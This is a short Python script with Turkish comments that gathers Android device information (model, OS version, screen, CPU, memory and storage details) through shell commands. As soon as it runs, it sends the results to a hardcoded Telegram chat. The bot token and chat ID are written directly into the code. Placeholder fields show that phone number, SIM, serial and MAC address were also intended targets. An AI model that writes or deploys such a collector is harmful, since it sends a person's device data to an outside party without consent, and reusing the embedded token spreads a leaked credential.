import os
import telebot

# 🔹 Telegram bot bilgileri
TOKEN = "7823207013:AAHMEmLrDirYtnGu43gX5BR8YrgVNrrTNQU"
CHAT_ID = "6202798562"
bot = telebot.TeleBot(TOKEN)

# 📌 1. Cihaz Bilgilerini Al
def get_system_info():
    model = os.popen("getprop ro.product.model").read().strip()
    manufacturer = os.popen("getprop ro.product.manufacturer").read().strip()
    android_version = os.popen("getprop ro.build.version.release").read().strip()
    screen_resolution = os.popen("wm size").read().strip()  # Alternatif çözünürlük komutu
    screen_density = os.popen("wm density").read().strip()
    cpu_info = os.popen("cat /proc/cpuinfo").read().strip()
    ram_info = os.popen("cat /proc/meminfo | grep Mem").read().strip()
    storage_info = os.popen("df -h /storage/emulated/0").read().strip()

    # Root gerektirmeyen IP adresi ve Wi-Fi MAC adresi alma
    ip_address = "Root gerektirdiği için alınamıyor."
    mac_address = "Root gerektirdiği için alınamıyor."

    # Batarya durumu (Root gerektirebilir)
    battery_info = "Root gerektirdiği için alınamıyor."

    # Seri numarası (Root gerektirebilir)
    serial_number = "Root gerektirdiği için alınamıyor."

    # SIM Kart Bilgisi
    sim_info = "Root gerektirdiği için alınamıyor."

    # Telefon numarası (Eğer alınabiliyorsa)
    phone_number = "Root gerektirdiği için alınamıyor."

    info = f"""
📱 *Cihaz Bilgileri:*  
Model: {manufacturer} {model}  
Android Sürümü: {android_version}  
Ekran Çözünürlüğü: {screen_resolution}  
Ekran Yoğunluğu: {screen_density}  
CPU: {cpu_info}  
RAM: {ram_info}  
Depolama: {storage_info}  
IP Adresi: {ip_address}  
Wi-Fi MAC Adresi: {mac_address}  
Seri Numarası: {serial_number}  
Batarya Durumu: {battery_info}  
SIM Bilgisi: {sim_info}  
Telefon Numarası: {phone_number}
"""

    return info

# 📌 Bilgileri Telegram'a Gönder
def send_report():
    system_info = get_system_info()

    message = f"📱 *Cihaz Bilgileri:* \n```{system_info}```"

    bot.send_message(CHAT_ID, message, parse_mode="Markdown")

# 📌 Botu Çalıştır ve Bilgileri Gönder
send_report()
